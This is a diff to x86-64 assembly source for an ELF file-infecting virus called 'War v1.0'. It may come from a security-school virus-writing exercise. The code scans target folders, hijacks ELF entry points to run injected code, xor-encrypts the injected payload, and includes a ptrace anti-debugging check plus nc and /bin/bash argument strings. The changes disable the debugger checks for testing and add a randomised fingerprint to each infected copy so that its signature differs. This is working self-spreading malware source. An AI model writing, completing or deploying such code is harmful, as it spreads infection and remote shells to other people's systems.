@@ -31,17 +31,18 @@ begin:
 	mov rbp, rsp
 	sub rsp, %$localsize 
 
-	mov rax, SYS_CLONE				; _pid = clone(
-	mov rdi, CLONE_VFORK				; 	CLONE_VFORK,
-	xor rsi, rsi					; 	0,
-	xor rdx, rdx					; 	0,
-	xor r10, r10					; 	0
-	syscall						; );
-	cmp rax, 0					; if (_pid < 0)
-	jl .skipped					; 	goto .skipped;
-	je .child					; else if (_pid == 0) goto .child;
+	; DEBUG
+	; mov rax, SYS_CLONE				; _pid = clone(
+	; mov rdi, CLONE_VFORK				; 	CLONE_VFORK,
+	; xor rsi, rsi					; 	0,
+	; xor rdx, rdx					; 	0,
+	; xor r10, r10					; 	0
+	; syscall						; );
+	; cmp rax, 0					; if (_pid < 0)
+	; jl .skipped					; 	goto .skipped;
+	; je .child					; else if (_pid == 0) goto .child;
 
-	jmp .skipped					; else goto .skipped;
+	; jmp .skipped					; else goto .skipped;
 
 .child:
 	call can_run_infection				; if (can_run_infection() == 0)
@@ -97,11 +98,14 @@ can_run_infection:
 ; result of xor between the two following blocks
 .begin_mixed_code:
 .begin_anti_debugging:
-	mov rax, SYS_PTRACE				; _ret = ptrace(
-	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
-	xor rsi, rsi					; 	0,
-	xor rdx, rdx					; 	0
-	syscall						; );
+	; mov rax, SYS_PTRACE				; _ret = ptrace(
+	; mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
+	; xor rsi, rsi					; 	0,
+	; xor rdx, rdx					; 	0
+	; syscall						; );
+
+	; DEBUG
+	mov rax, 0
 
 	cmp rax, 0					; if (_ret < 0)
 	jl .debugged					; 	goto .debugged;
@@ -498,7 +502,9 @@ nc_arg6: db "/bin/bash", 0
 magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
-signature: db "War v1.0 by jmaia and dhubleur", 0
+clean: db 0x0
+signature: db "War v1.0 by jmaia and dhubleur - "
+fingerprint: db "0", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -524,13 +530,21 @@ infection_routine:
 	mov [compressed_data_size], rdi			; compressed_data_size = _compressed_data_size;
 	mov [real_begin_compressed_data_ptr], rsi	; real_begin_compressed_data_ptr = _real_begin_compressed_data_ptr;
 
+	mov rdi, 42					; srand(42);
+	lea rsi, [rand_buffer]				; ...
+	call srand					; ...
+
 	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1, compressed_data_size, _real_begin_compressed_data_ptr);
 	mov rsi, [compressed_data_size]			; ...
 	mov rdx, [real_begin_compressed_data_ptr]	; ...
+	lea rcx, [rand_buffer]				; ...
+	lea r8, [rand_index]				; ...
 	call treate_folder				; ...
 	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2, compressed_data_size, _real_begin_compressed_data_ptr);
 	mov rsi, [compressed_data_size]			; ...
 	mov rdx, [real_begin_compressed_data_ptr]	; ...
+	lea rcx, [rand_buffer]				; ...
+	lea r8, [rand_index]				; ...
 	call treate_folder				; ...
 
 	mov rax, SYS_FORK				; _ret = fork();
@@ -597,8 +611,8 @@ infection_routine:
 		%pop
 		ret
 
-; void treate_folder(char const *_folder, long _compressed_data_size, uint8_t *_compressed_data_ptr);
-; void treate_folder(rdi folder, rsi _compressed_data_size, rdx _compressed_data_ptr);
+; void treate_folder(char const *_folder, long _compressed_data_size, uint8_t *_compressed_data_ptr, unsigned int *_rand_buffer, long *_rand_index);
+; void treate_folder(rdi folder, rsi _compressed_data_size, rdx _compressed_data_ptr, rcx _rand_buffer, r8 _rand_index);
 treate_folder:
 	%push context
 	%stacksize flat64
@@ -613,6 +627,8 @@ treate_folder:
 	%local compressed_data_ptr:qword		; uint8_t *compressed_data_ptr;
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
 	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
+	; %local rand_buffer:qword			; unsigned int *rand_buffer;
+	; %local rand_index:qword				; long *rand_index;
 
 	; Initializes stack frame
 	push rbp
@@ -622,6 +638,8 @@ treate_folder:
 	mov [folder], rdi				; folder = _folder;
 	mov [compressed_data_size], rsi			; compressed_data_size = _compressed_data_size;
 	mov [compressed_data_ptr], rdx			; compressed_data_ptr = _compressed_data_ptr;
+	; mov [rand_buffer], rcx				; rand_buffer = _rand_buffer;
+	; mov [rand_index], r8				; rand_index = _rand_index;
 
 	; Open folder
 	mov rax, SYS_OPEN				; _ret = open(
@@ -656,7 +674,9 @@ treate_folder:
 	mov rsi, [cur_dirent]				; 	cur_dirent
 	add rsi, linux_dirent64.d_name			; 		->d_name,
 	mov rdx, [compressed_data_size]			;	compressed_data_size,
-	mov rcx, [compressed_data_ptr]			;	compressed_data_ptr;
+	mov rcx, [compressed_data_ptr]			;	compressed_data_ptr
+	mov r8, [rand_buffer]				;	rand_buffer,
+	mov r9, [rand_index]				;	rand_index);
 	call treat_file					; );
 
 	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
@@ -685,8 +705,8 @@ treate_folder:
 	%pop
 	ret
 
-; void treat_file(char const *_dirname, char const *_filename, long _compressed_data_size, uint8_t *_compressed_data_ptr);
-; void treat_file(rdi dirname, rsi filename, rdx _compressed_data_size, rcx _compressed_data_ptr);
+; void treat_file(char const *_dirname, char const *_filename, long _compressed_data_size, uint8_t *_compressed_data_ptr, unsigned int *_rand_buffer, long *_rand_index);
+; void treat_file(rdi dirname, rsi filename, rdx _compressed_data_size, rcx _compressed_data_ptr, r8 _rand_buffer, r9 _rand_index);
 treat_file:
 	%push context
 	%stacksize flat64
@@ -708,6 +728,8 @@ treat_file:
 	%assign %$localsize %$localsize + PATH_MAX	; ...
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
 	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
+	%local rand_buffer:qword			; unsigned int *rand_buffer;
+	%local rand_index:qword				; long *rand_index;
 
 	; Initializes stack frame
 	push rbp
@@ -718,6 +740,8 @@ treat_file:
 	mov [filename], rsi				; filename = _filename;
 	mov [compressed_data_size], rdx			; compressed_data_size = _compressed_data_size;
 	mov [compressed_data_ptr], rcx			; compressed_data_ptr = _compressed_data_ptr;
+	mov [rand_buffer], r8				; rand_buffer = _rand_buffer;
+	mov [rand_index], r9				; rand_index = _rand_index;
 
 	xor r8, r8					; len = 0;
 	lea rdi, [pathbuf]				; dest = pathbuf;
@@ -911,6 +935,16 @@ treat_file:
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
+
+	; change fingerprint in injected code
+	mov rdi, [rand_buffer]				; fingeprint = rand();
+	mov rsi, [rand_index]				; ...
+	call rand					; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _fingerprint_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, fingerprint - _start			; 	+ (fingerprint - _start)
+	call itoa					; itoa(_fingerprint_ptr, fingeprint);
 
 	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
